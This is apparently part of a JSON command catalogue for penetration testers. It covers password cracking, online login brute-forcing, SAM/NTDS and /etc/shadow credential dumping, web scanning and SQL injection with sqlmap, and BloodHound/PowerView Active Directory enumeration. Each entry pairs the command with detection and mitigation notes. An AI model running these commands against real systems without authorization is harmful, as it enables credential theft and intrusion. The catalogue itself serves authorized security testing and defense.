 {"id":"pw-hashcat-rules","cat":"Password Auditing","title":"Wordlist + rules attack (hashcat)","desc":"Expand a wordlist with mutation rules (e.g. best64) to catch mangled passwords. Requires hashcat.","danger":"Authorized password-audit engagements only.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Not observable on the target; detect the credential dump that produced the hashes and treat exported hash files as a breach.","mitigate":"Require length over complexity; ban common bases/keyboard walks; use slow hashes so rule-mangling stays infeasible.","code":{"linux":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -r {{RULES:/usr/share/hashcat/rules/best64.rule}}","mac":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}} -r {{RULES:/opt/homebrew/share/hashcat/rules/best64.rule}}","ps":"hashcat.exe -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}} -r {{RULES:rules\\best64.rule}}"}},
 {"id":"pw-hashcat-mask","cat":"Password Auditing","title":"Mask / brute-force attack (hashcat)","desc":"Brute-force a known password pattern with a charset mask (?l lower ?u upper ?d digit ?s special ?a all). Requires hashcat.","danger":"Authorized password-audit engagements only; masks can run for a very long time.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline and invisible to the target; monitor instead for the hash exfiltration that precedes it.","mitigate":"Increase minimum length — each added character multiplies mask keyspace; enforce slow hashing.","code":{"linux":"hashcat -m {{MODE:0}} -a 3 hashes.txt '{{MASK:?u?l?l?l?l?d?d?d}}'","mac":"hashcat -m {{MODE:0}} -a 3 hashes.txt '{{MASK:?u?l?l?l?l?d?d?d}}'","ps":"hashcat.exe -m {{MODE:0}} -a 3 hashes.txt {{MASK:?u?l?l?l?l?d?d?d}}"}},
 {"id":"pw-hashcat-ntlm","cat":"Password Auditing","title":"Crack Windows NTLM hashes","desc":"Audit NTLM (mode 1000) hashes pulled from a SAM/NTDS dump. Requires hashcat.","danger":"Authorized AD/password audits only.","team":"red","tags":["password","active-directory"],"attack":["T1110.002"],"detect":"Cracking itself is offline; detect the SAM/NTDS extraction (4662 replication, remote registry, secretsdump) that produced the NT hashes.","mitigate":"Enforce long passphrases; deploy LAPS for local admins; monitor and restrict credential dumping paths.","code":{"linux":"hashcat -m 1000 -a 0 nt-hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 1000 -a 0 nt-hashes.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 1000 -a 0 nt-hashes.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-netntlmv2","cat":"Password Auditing","title":"Crack NetNTLMv2 hashes","desc":"Audit captured NetNTLMv2 (mode 5600) challenge/response hashes. Requires hashcat.","danger":"Authorized engagements only; only crack responses you were permitted to capture.","team":"red","tags":["password","active-directory"],"attack":["T1110.002"],"detect":"The capture step (LLMNR/NBT-NS poisoning, SMB relay) is the observable event — watch for rogue responders and unexpected SMB auth; cracking is offline.","mitigate":"Disable LLMNR/NBT-NS; require SMB signing; enforce strong passwords so captured hashes stay uncrackable.","code":{"linux":"hashcat -m 5600 -a 0 netntlmv2.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 5600 -a 0 netntlmv2.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 5600 -a 0 netntlmv2.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-kerberoast","cat":"Password Auditing","title":"Crack Kerberoast (TGS-REP) hashes","desc":"Audit service-account passwords from Kerberos TGS-REP tickets (mode 13100). Requires hashcat.","danger":"Authorized AD audits only.","team":"red","tags":["password","active-directory"],"attack":["T1558.003"],"detect":"Spike in TGS service-ticket requests (event 4769) with RC4 encryption (0x17) for many SPNs from one account.","mitigate":"Use 25+ char random passwords or gMSA for service accounts; disable RC4; alert on bulk 4769.","code":{"linux":"hashcat -m 13100 -a 0 tgs.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 13100 -a 0 tgs.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 13100 -a 0 tgs.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-asrep","cat":"Password Auditing","title":"Crack AS-REP roasting hashes","desc":"Audit passwords of accounts with Kerberos pre-auth disabled (mode 18200). Requires hashcat.","danger":"Authorized AD audits only.","team":"red","tags":["password","active-directory"],"attack":["T1558.004"],"detect":"AS-REQ (event 4768) requesting RC4 tickets for accounts flagged 'do not require pre-auth', especially in bulk.","mitigate":"Require Kerberos pre-authentication on every account; use strong passwords; alert on DONT_REQ_PREAUTH.","code":{"linux":"hashcat -m 18200 -a 0 asrep.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 18200 -a 0 asrep.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 18200 -a 0 asrep.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-show","cat":"Password Auditing","title":"Show cracked hashes (potfile)","desc":"Print already-cracked plaintexts from the potfile without re-running. Requires hashcat.","tags":["password","reference"],"code":{"linux":"hashcat -m {{MODE:1000}} hashes.txt --show","mac":"hashcat -m {{MODE:1000}} hashes.txt --show","ps":"hashcat.exe -m {{MODE:1000}} hashes.txt --show"}},
 {"id":"pw-hashcat-benchmark","cat":"Password Auditing","title":"Benchmark cracking speed","desc":"Measure hashes/second for a mode on this hardware to size an audit. Requires hashcat.","tags":["password","reference"],"code":{"linux":"hashcat -b -m {{MODE:1000}}","mac":"hashcat -b -m {{MODE:1000}}","ps":"hashcat.exe -b -m {{MODE:1000}}"}},
 {"id":"pw-john-basic","cat":"Password Auditing","title":"Crack with John (default mode)","desc":"Run John the Ripper's default single/wordlist/incremental pipeline over a hash file. Requires John the Ripper.","danger":"Authorized password audits only.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline; detect the credential theft that produced the hash file rather than the crack itself.","mitigate":"Enforce long passphrases and slow hashes; rotate exposed credentials.","code":{"linux":"john hashes.txt\n# then view results:\njohn --show hashes.txt","mac":"john hashes.txt\njohn --show hashes.txt","ps":"john.exe hashes.txt"}},
 {"id":"pw-john-wordlist","cat":"Password Auditing","title":"John wordlist + mangling rules","desc":"Dictionary attack with John's rule-based mangling and an explicit hash format. Requires John the Ripper.","danger":"Authorized password audits only.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Not observable on the target; treat any exported hash file as evidence of a prior credential-access breach.","mitigate":"Ban common password bases; require length; use adaptive slow hashing.","code":{"linux":"john --format={{FORMAT:nt}} --wordlist={{WORDLIST:/usr/share/wordlists/rockyou.txt}} --rules hashes.txt","mac":"john --format={{FORMAT:nt}} --wordlist={{WORDLIST:rockyou.txt}} --rules hashes.txt","ps":"john.exe --format={{FORMAT:nt}} --wordlist={{WORDLIST:rockyou.txt}} --rules hashes.txt"}},
 {"id":"pw-john-formats","cat":"Password Auditing","title":"List John supported formats","desc":"Show every hash format John can crack so you can pick --format. Requires John the Ripper.","tags":["password","reference"],"code":{"linux":"john --list=formats\n# detailed view:\njohn --list=format-details | less","mac":"john --list=formats","ps":"john.exe --list=formats"}},
 {"id":"pw-john-unshadow","cat":"Password Auditing","title":"Merge passwd + shadow for John","desc":"Combine /etc/passwd and /etc/shadow into one crackable file for a local-account audit. Requires John the Ripper + root.","danger":"Reads /etc/shadow; root required. Authorized audits of systems you administer only.","team":"red","tags":["password","linux"],"attack":["T1003.008"],"detect":"Auditd: root read of /etc/shadow, or creation of a combined credentials file; unexpected sudo to john/unshadow.","mitigate":"Restrict root; monitor access to /etc/shadow; enforce SHA-512/yescrypt with strong passwords.","code":{"linux":"sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt"}},
 {"id":"pw-john-show","cat":"Password Auditing","title":"Show John-cracked passwords","desc":"Print plaintexts John has already recovered for a hash file. Requires John the Ripper.","tags":["password","reference"],"code":{"linux":"john --show --format={{FORMAT:nt}} hashes.txt","mac":"john --show --format={{FORMAT:nt}} hashes.txt","ps":"john.exe --show --format={{FORMAT:nt}} hashes.txt"}},
 {"id":"pw-hashfile-extract","cat":"Password Auditing","title":"Extract hash from protected file","desc":"Pull a crackable hash from a password-protected archive/document via zip2john / office2john / pdf2john. Requires John the Ripper (jumbo).","danger":"Audit only files you own or are authorized to test.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline conversion — not visible on the network; the risk is the protected file itself being accessible to an attacker.","mitigate":"Use strong passphrases on protected files; prefer authenticated encryption; limit file distribution.","code":{"linux":"zip2john {{FILE:secret.zip}} > file.hash\n# or: office2john {{FILE:secret.docx}} > file.hash\n# or: pdf2john {{FILE:secret.pdf}} > file.hash\njohn file.hash","mac":"zip2john {{FILE:secret.zip}} > file.hash\njohn file.hash"}},
 {"id":"pw-hydra-ssh","cat":"Password Auditing","title":"SSH login testing (hydra)","desc":"Test one account against a password list over SSH. Requires hydra.","danger":"Online guessing causes lockouts and noisy logs; authorized targets only.","team":"red","tags":["password","remote"],"attack":["T1110.001"],"detect":"Burst of 'Failed password' entries in /var/log/auth.log from one source IP hitting sshd repeatedly.","mitigate":"Key-only auth, fail2ban/rate limiting, MFA, and account lockout thresholds.","code":{"linux":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ssh://{{TARGET:10.0.0.5}}","mac":"hydra -l {{USER:admin}} -P {{WORDLIST:rockyou.txt}} ssh://{{TARGET:10.0.0.5}}"}},
 {"id":"pw-hydra-http","cat":"Password Auditing","title":"Web login form testing (hydra)","desc":"Probe an HTTP POST login form for weak credentials (F= marks the failure string). Requires hydra.","danger":"Authorized web-app assessments only.","team":"red","tags":["password","web"],"attack":["T1110.001"],"detect":"Web/WAF logs show many POSTs to the login endpoint with 401/302 from one IP; failed-login metric spike.","mitigate":"CAPTCHA after failures, per-account lockout, WAF rate limiting, and MFA.","code":{"linux":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} {{TARGET:10.0.0.5}} http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"","mac":"hydra -l {{USER:admin}} -P {{WORDLIST:rockyou.txt}} {{TARGET:10.0.0.5}} http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\""}},
 {"id":"pw-medusa","cat":"Password Auditing","title":"Parallel login testing (medusa)","desc":"Modular, threaded credential testing against a service (-M ssh, ftp, smbnt, http...). Requires medusa.","danger":"Online, noisy, lockout-prone; authorized targets only.","team":"red","tags":["password","remote"],"attack":["T1110.001"],"detect":"Rapid parallel auth failures across accounts/services from one source; SIEM login-failure spike.","mitigate":"Lockout thresholds, rate limiting, MFA, and network segmentation of management services.","code":{"linux":"medusa -h {{TARGET:10.0.0.5}} -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -M ssh","mac":"medusa -h {{TARGET:10.0.0.5}} -u {{USER:admin}} -P {{WORDLIST:rockyou.txt}} -M ssh"}},
 {"id":"pw-secretsdump","cat":"Password Auditing","title":"Dump hashes for offline audit (secretsdump)","desc":"Extract SAM/LSA/NTDS password hashes remotely or from offline hive files for audit. Requires impacket (secretsdump.py).","danger":"Highly sensitive; domain/admin credentials required. Authorized AD audits only.","team":"red","tags":["password","active-directory","post-ex"],"attack":["T1003.002","T1003.003"],"detect":"Network admin logon (4624/4672) plus remote registry or DRSUAPI/DCSync replication (4662 with replication GUID); impacket service artifacts.","mitigate":"Tiered admin, restrict DC logons, monitor DCSync rights, deploy LAPS, and alert on remote SAM/NTDS access.","code":{"linux":"secretsdump.py {{DOMAIN:CORP}}/{{USER:admin}}@{{TARGET:10.0.0.5}}\n# from offline registry hives:\nsecretsdump.py -sam SAM -system SYSTEM LOCAL","mac":"secretsdump.py {{DOMAIN:CORP}}/{{USER:admin}}@{{TARGET:10.0.0.5}}"}},
 {"id":"pw-wordlist-gen","cat":"Password Auditing","title":"Build a target wordlist","desc":"Spider a site for candidate words (cewl) or generate patterned combinations (crunch). Requires cewl / crunch.","tags":["password","recon"],"code":{"linux":"cewl {{URL:http://target.example}} -m 6 -w words.txt\n# fixed-length pattern (@=lower %=digit):\ncrunch 8 8 -t Pass@@%% -o crunch.txt","mac":"crunch 8 8 -t Pass@@%% -o crunch.txt"}},
 {"id":"pw-policy-windows","cat":"Password Auditing","title":"Audit Windows password policy","desc":"Review length, age, history, and lockout settings on a workstation or domain.","tags":["password","account"],"code":{"ps":"net accounts\n# export the local security policy and pull password/lockout lines:\nsecedit /export /cfg \"$env:TEMP\\secpol.cfg\" | Out-Null\nSelect-String -Path \"$env:TEMP\\secpol.cfg\" -Pattern 'Password|Lockout'","cmd":"net accounts\nnet accounts /domain"}},
 {"id":"pw-policy-linux","cat":"Password Auditing","title":"Audit Unix password policy","desc":"Review password aging and complexity requirements for accounts.","tags":["password","account"],"code":{"linux":"chage -l {{USER:root}}\ngrep -E 'PASS_(MAX|MIN|WARN)_' /etc/login.defs\ngrep -E 'minlen|dcredit|ucredit|ocredit' /etc/security/pwquality.conf 2>/dev/null","mac":"pwpolicy -getaccountpolicies 2>/dev/null\nsudo pwpolicy -u {{USER:admin}} -getpolicy"}},

/* ================= WEB APP TESTING ================= */
 {"id":"web-curl-headers","cat":"Web App Testing","title":"Inspect HTTP headers with curl","desc":"Fetch response headers and the server banner with a curl HEAD request (-I).","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Web/proxy access logs record HEAD requests and the client User-Agent (curl/x.y).","mitigate":"Suppress or genericize Server and X-Powered-By banners; flag default tool User-Agents at the WAF.","danger":"Authorized testing only; passive but still logged against the target.","code":{"ps":"curl.exe -I https://{{TARGET:example.com}}","cmd":"curl -I https://{{TARGET:example.com}}","mac":"curl -I https://{{TARGET:example.com}}","linux":"curl -I https://{{TARGET:example.com}}"}},
 {"id":"web-curl-methods","cat":"Web App Testing","title":"Enumerate allowed HTTP methods","desc":"Send an OPTIONS request with curl and read the Allow header to see permitted verbs.","team":"red","tags":["web","enumeration"],"attack":["T1594"],"detect":"Access logs show OPTIONS/TRACE/PUT requests, which are rare in normal browsing.","mitigate":"Disable unused methods (TRACE, PUT, DELETE) at the web server; return 405 for them.","danger":"Authorized testing only; verb probing may trip WAF method-based rules.","code":{"ps":"curl.exe -i -s -X OPTIONS https://{{TARGET:example.com}}","cmd":"curl -i -s -X OPTIONS https://{{TARGET:example.com}}","mac":"curl -i -s -X OPTIONS https://{{TARGET:example.com}}","linux":"curl -i -s -X OPTIONS https://{{TARGET:example.com}}"}},
 {"id":"web-security-headers","cat":"Web App Testing","title":"Check for missing security headers","desc":"Grep the response headers for HSTS, CSP, and framing/content-type protections.","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Nearly indistinguishable from normal traffic beyond repeated header-only fetches in logs.","mitigate":"Deploy HSTS, CSP, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.","danger":"Passive read of headers; run only against systems you are authorized to test.","code":{"ps":"curl.exe -sI https://{{TARGET:example.com}} | Select-String 'Strict-Transport|Content-Security|X-Frame|X-Content-Type|Referrer-Policy'","mac":"curl -sI https://{{TARGET:example.com}} | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy'","linux":"curl -sI https://{{TARGET:example.com}} | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy'"}},
 {"id":"web-cors","cat":"Web App Testing","title":"Test CORS reflection with curl","desc":"Send a crafted Origin header and inspect Access-Control-Allow-Origin for permissive reflection.","team":"red","tags":["web","enumeration"],"attack":["T1595"],"detect":"WAF/app logs show requests carrying anomalous or attacker-controlled Origin headers.","mitigate":"Whitelist explicit origins; never reflect an arbitrary Origin alongside Allow-Credentials: true.","danger":"Authorized testing only; demonstrates data-exposure risk, do not exfiltrate real data.","code":{"ps":"curl.exe -s -I -H \"Origin: https://evil.example\" https://{{TARGET:example.com}} | Select-String 'Access-Control'","mac":"curl -s -I -H 'Origin: https://evil.example' https://{{TARGET:example.com}} | grep -i access-control","linux":"curl -s -I -H 'Origin: https://evil.example' https://{{TARGET:example.com}} | grep -i access-control"}},
 {"id":"web-robots","cat":"Web App Testing","title":"Read robots.txt and sitemap","desc":"Retrieve robots.txt to surface disallowed or hidden paths a site advertises.","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Requests to /robots.txt and /sitemap.xml appear in access logs (also normal for crawlers).","mitigate":"Never rely on robots.txt to hide sensitive paths; enforce authentication and authorization.","danger":"Passive retrieval; authorized testing only.","code":{"ps":"curl.exe -s https://{{TARGET:example.com}}/robots.txt","cmd":"curl -s https://{{TARGET:example.com}}/robots.txt","mac":"curl -s https://{{TARGET:example.com}}/robots.txt","linux":"curl -s https://{{TARGET:example.com}}/robots.txt"}},
 {"id":"web-whatweb","cat":"Web App Testing","title":"Fingerprint web tech with whatweb","desc":"Identify CMS, frameworks, and versions with whatweb (non-default tool; -a sets aggression 1-4).","team":"red","tags":["web","recon"],"attack":["T1592.002"],"detect":"Bursts of requests with the whatweb User-Agent and probing of known fingerprint paths.","mitigate":"Strip version banners; deploy a WAF to rate-limit and block scanner signatures.","danger":"Authorized testing only; aggression level 3+ actively probes the application.","code":{"linux":"whatweb -a 3 https://{{TARGET:example.com}}"}},
 {"id":"web-wafw00f","cat":"Web App Testing","title":"Detect a WAF with wafw00f","desc":"Fingerprint the WAF or CDN protecting a site with wafw00f (non-default tool).","team":"red","tags":["web","recon"],"attack":["T1595"],"detect":"A sequence of deliberately malicious-looking probes crafted to trigger WAF fingerprints.","mitigate":"Configure the WAF to respond uniformly so it cannot be fingerprinted; monitor probe patterns.","danger":"Authorized testing only; sends benign attack-like payloads to elicit WAF responses.","code":{"mac":"wafw00f https://{{TARGET:example.com}}","linux":"wafw00f https://{{TARGET:example.com}}"}},
 {"id":"web-nikto","cat":"Web App Testing","title":"Scan a web server with nikto","desc":"Check a web server for known issues, misconfigurations, and risky files with nikto (non-default).","team":"red","tags":["web","scanning"],"attack":["T1595.002"],"detect":"Very noisy: thousands of requests, the nikto User-Agent, and many 404s on nonexistent paths.","mitigate":"WAF signature blocking, per-IP rate limiting, and removal of default and sample files.","danger":"Authorized testing only; loud, easily attributed, and can destabilize fragile apps.","code":{"mac":"nikto -h https://{{TARGET:example.com}}","linux":"nikto -h https://{{TARGET:example.com}}"}},
 {"id":"web-nuclei","cat":"Web App Testing","title":"Template scanning with nuclei","desc":"Run community vulnerability templates against a target with nuclei (ProjectDiscovery; non-default).","team":"red","tags":["web","scanning"],"attack":["T1595.002"],"detect":"High request volume matching known nuclei template paths and payloads in WAF logs.","mitigate":"Keep software patched; block scanner signatures; rate-limit per source IP.","danger":"Authorized testing only; some templates send active exploit checks.","code":{"mac":"nuclei -u https://{{TARGET:example.com}} -severity critical,high,medium","linux":"nuclei -u https://{{TARGET:example.com}} -severity critical,high,medium"}},
 {"id":"web-nmap-http","cat":"Web App Testing","title":"Nmap HTTP NSE enumeration","desc":"Enumerate web server details with nmap HTTP scripts (http-title, http-headers, http-enum, http-methods).","team":"red","tags":["web","scanning"],"attack":["T1595.002"],"detect":"Port scan plus scripted HTTP probes to common paths, visible in IDS and access logs.","mitigate":"Restrict exposure, patch, and alert on http-enum's characteristic path sweeps.","danger":"Authorized testing only; http-enum probes many paths and is easily noticed.","code":{"mac":"nmap -p 80,443 --script \"http-title,http-headers,http-enum,http-methods\" {{TARGET:example.com}}","linux":"nmap -p 80,443 --script \"http-title,http-headers,http-enum,http-methods\" {{TARGET:example.com}}"}},
 {"id":"web-gobuster-dir","cat":"Web App Testing","title":"Directory brute force with gobuster","desc":"Brute-force directories and files from a wordlist with gobuster dir (non-default; -t threads).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Large spike of 404s from one IP with a wordlist User-Agent and sequential path guessing.","mitigate":"Rate-limit, block on excessive 404s, and keep sensitive files out of the web root.","danger":"Authorized testing only; high request volume can degrade the target.","code":{"mac":"gobuster dir -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -t 50","linux":"gobuster dir -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -t 50"}},
 {"id":"web-ffuf-dir","cat":"Web App Testing","title":"Directory fuzzing with ffuf","desc":"Fuzz directories/files using the FUZZ keyword with ffuf (non-default; -mc filters match codes).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Rapid path enumeration with the ffuf User-Agent and many 404/403 responses.","mitigate":"Rate-limit per IP, deploy a WAF, and ensure no sensitive files are exposed.","danger":"Authorized testing only; can generate heavy load on the target.","code":{"mac":"ffuf -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}:FUZZ -u https://{{TARGET:example.com}}/FUZZ -mc 200,204,301,302,307,401,403","linux":"ffuf -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}:FUZZ -u https://{{TARGET:example.com}}/FUZZ -mc 200,204,301,302,307,401,403"}},
 {"id":"web-ffuf-param","cat":"Web App Testing","title":"Parameter fuzzing with ffuf","desc":"Discover hidden query parameters by fuzzing the FUZZ keyword with ffuf (-ac auto-calibrates filters).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Many requests to the same endpoint with varying parameter names (unusual parameter churn).","mitigate":"Validate and whitelist expected parameters; alert on unknown-parameter probing.","danger":"Authorized testing only; auto-calibration still sends large request volumes.","code":{"mac":"ffuf -w {{WORDLIST:params.txt}}:FUZZ -u 'https://{{TARGET:example.com}}/page?FUZZ=1' -mc 200 -ac","linux":"ffuf -w {{WORDLIST:params.txt}}:FUZZ -u 'https://{{TARGET:example.com}}/page?FUZZ=1' -mc 200 -ac"}},
 {"id":"web-feroxbuster","cat":"Web App Testing","title":"Recursive content discovery","desc":"Recursively discover content with feroxbuster (non-default; Rust tool that recurses into found dirs).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Recursive path enumeration producing deep directory request trees and many 404s.","mitigate":"Rate-limit, block scanner signatures, and audit exposed directories.","danger":"Authorized testing only; recursion multiplies request volume quickly.","code":{"mac":"feroxbuster -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","linux":"feroxbuster -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}"}},
 {"id":"web-gobuster-vhost","cat":"Web App Testing","title":"Virtual host discovery","desc":"Find virtual hosts on a shared IP by fuzzing the Host header with gobuster vhost (--append-domain).","team":"red","tags":["web","discovery"],"attack":["T1595.003"],"detect":"Repeated requests to one IP with many differing Host header values.","mitigate":"Require valid SNI/Host, default-deny unknown vhosts, and monitor Host header anomalies.","danger":"Authorized testing only; may reveal internal or staging sites.","code":{"mac":"gobuster vhost -u https://{{TARGET:example.com}} -w {{WORDLIST:subdomains.txt}} --append-domain","linux":"gobuster vhost -u https://{{TARGET:example.com}} -w {{WORDLIST:subdomains.txt}} --append-domain"}},
 {"id":"web-arjun","cat":"Web App Testing","title":"HTTP parameter discovery with arjun","desc":"Discover valid HTTP parameters for an endpoint with arjun (non-default; Python tool).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Bursts of requests differing only by parameter names against a single endpoint.","mitigate":"Strictly validate accepted parameters; alert on parameter brute-force patterns.","danger":"Authorized testing only; sends many probing requests to the endpoint.","code":{"linux":"arjun -u https://{{TARGET:example.com}}/api/endpoint"}},
 {"id":"web-katana","cat":"Web App Testing","title":"Crawl endpoints with katana","desc":"Map endpoints and JavaScript-referenced URLs with katana (ProjectDiscovery; -jc crawls JS, -d depth).","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Systematic breadth/depth crawl from one client, including parsing of JS assets.","mitigate":"Rate-limit crawlers, require auth for sensitive areas, and monitor aggressive crawling.","danger":"Authorized testing only; deep crawls generate substantial traffic.","code":{"mac":"katana -u https://{{TARGET:example.com}} -jc -d 3","linux":"katana -u https://{{TARGET:example.com}} -jc -d 3"}},
 {"id":"web-httpx","cat":"Web App Testing","title":"Probe live web services with httpx","desc":"Probe for live services, titles, status codes, and tech with httpx (ProjectDiscovery, not the Python lib).","team":"red","tags":["web","discovery"],"attack":["T1595"],"detect":"Fan-out of lightweight requests across many hosts/ports from a single source.","mitigate":"Rate-limit and geofence; alert on mass probing of the estate.","danger":"Authorized testing only; this is ProjectDiscovery httpx, distinct from the Python httpx library.","code":{"mac":"httpx -u https://{{TARGET:example.com}} -title -status-code -tech-detect","linux":"httpx -u https://{{TARGET:example.com}} -title -status-code -tech-detect"}},
 {"id":"web-sqlmap","cat":"Web App Testing","title":"SQL injection testing with sqlmap","desc":"Automated SQLi detection and exploitation with sqlmap (non-default; --batch runs non-interactively).","team":"red","tags":["web","exploitation"],"attack":["T1190"],"detect":"UNION/sleep/boolean SQLi payloads and the sqlmap User-Agent flood the app and DB logs.","mitigate":"Use parameterized queries, least-privilege DB accounts, and WAF SQLi rules.","danger":"Authorized testing only; can read, modify, or dump data — never target production without written scope.","code":{"mac":"sqlmap -u 'https://{{TARGET:example.com}}/page?id=1' --batch --level 2 --risk 1","linux":"sqlmap -u 'https://{{TARGET:example.com}}/page?id=1' --batch --level 2 --risk 1"}},
 {"id":"web-wpscan","cat":"Web App Testing","title":"WordPress enumeration with wpscan","desc":"Enumerate WordPress users, themes, and vulnerable plugins with wpscan (non-default; --enumerate).","team":"red","tags":["web","enumeration"],"attack":["T1595.002"],"detect":"Requests to /wp-json, /?author=, and readme.html plus the wpscan User-Agent.","mitigate":"Hide the version, block user enumeration, patch plugins, and rate-limit /wp-login.","danger":"Authorized testing only; the vuln data feed needs a free API token but enumeration works without it.","code":{"mac":"wpscan --url https://{{TARGET:example.com}} --enumerate u,vp","linux":"wpscan --url https://{{TARGET:example.com}} --enumerate u,vp"}},
 {"id":"web-dalfox","cat":"Web App Testing","title":"XSS testing with dalfox","desc":"Test parameters for reflected/DOM XSS with dalfox (non-default; Go-based scanner).","team":"red","tags":["web","exploitation"],"attack":["T1190"],"detect":"XSS probe strings (script tags, event handlers) reflected in requests across parameters.","mitigate":"Context-aware output encoding, a strong CSP, input validation, and WAF XSS signatures.","danger":"Authorized testing only; injects active XSS test payloads into the target.","code":{"mac":"dalfox url 'https://{{TARGET:example.com}}/search?q=test'","linux":"dalfox url 'https://{{TARGET:example.com}}/search?q=test'"}},
 {"id":"web-sslscan","cat":"Web App Testing","title":"TLS/cipher enumeration with sslscan","desc":"Enumerate supported TLS versions, ciphers, and certificate details with sslscan (non-default).","team":"red","tags":["web","tls"],"attack":["T1595"],"detect":"Multiple TLS handshakes cycling cipher suites from one source in a short window.","mitigate":"Disable legacy TLS/ciphers, enforce TLS 1.2+, and monitor for handshake scanning.","danger":"Authorized testing only; passive TLS enumeration but still logged at the TLS terminator.","code":{"mac":"sslscan {{TARGET:example.com}}:443","linux":"sslscan {{TARGET:example.com}}:443"}},

/* ================= ACTIVE DIRECTORY ATTACKS ================= */
 {"id":"adx-sharphound-collect","cat":"Active Directory Attacks","title":"SharpHound collection for BloodHound","desc":"Collect AD objects, sessions, and ACLs into a zip for BloodHound analysis. Requires SharpHound.exe or the SharpHound.ps1 collector on a domain-joined host.","danger":"Authorized engagements only. Generates heavy LDAP/SMB traffic and is widely signatured.","team":"red","tags":["active-directory","enumeration","recon"],"attack":["T1087.002","T1069.002"],"detect":"Directory Service 4662 spikes and Event ID 1644 (LDAP query logging) show one host reading large swaths of AD; EDR/AV flags SharpHound; unusual SMB session enumeration across many hosts.","mitigate":"Deploy AD tiering and least privilege; monitor for bulk LDAP reads; restrict SAMR/session enumeration (RestrictRemoteSam); alert on collector signatures.","code":{"ps":"# Standalone binary (domain-joined context):\n.\\SharpHound.exe -c All -d {{DOMAIN:corp.local}} --zipfilename loot\n\n# PowerShell collector variant:\nImport-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -Domain {{DOMAIN:corp.local}} -OutputDirectory C:\\Temp"}},
 {"id":"adx-bloodhound-python","cat":"Active Directory Attacks","title":"Remote BloodHound collection (Python)","desc":"Collect AD data remotely over LDAP with valid creds, no code on the target. Requires bloodhound-python (pip).","danger":"Authorized use only. Bulk LDAP reads are noisy and logged on the DC.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002","T1069.002"],"detect":"DC LDAP query logging (Event 1644) and 4662 show a single account enumerating users, groups, ACLs, and trusts in one burst from a non-admin workstation.","mitigate":"Least-privilege service accounts; monitor for anomalous LDAP volume; segment management access to DCs.","code":{"linux":"bloodhound-python -u {{USER:jdoe}} -p '{{PASS}}' -d {{DOMAIN:corp.local}} -ns {{DC_IP:10.0.0.10}} -c All --zip","mac":"bloodhound-python -u {{USER:jdoe}} -p '{{PASS}}' -d {{DOMAIN:corp.local}} -ns {{DC_IP:10.0.0.10}} -c All --zip"}},
 {"id":"adx-powerview-domain-enum","cat":"Active Directory Attacks","title":"PowerView domain/user/computer enumeration","desc":"Enumerate the domain, users, computers, and privileged groups over LDAP. Requires PowerView.ps1 (PowerSploit/Empire).","danger":"Authorized use only. LDAP enumeration is logged on the DC.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002","T1069.002"],"detect":"4662 and LDAP diagnostics (1644) show broad object queries; unusual PowerShell module loads flagged by AMSI/Sysmon Event 7 (Assembly/module load).","mitigate":"Constrained Language Mode; AMSI + script block logging (4104); restrict who can read sensitive attributes; alert on PowerView cmdlet patterns.","code":{"ps":"Import-Module .\\PowerView.ps1\nGet-Domain\nGet-DomainUser -Properties samaccountname,description,pwdlastset | Sort-Object pwdlastset\nGet-DomainComputer -Properties dnshostname,operatingsystem\nGet-DomainGroupMember 'Domain Admins'"}},
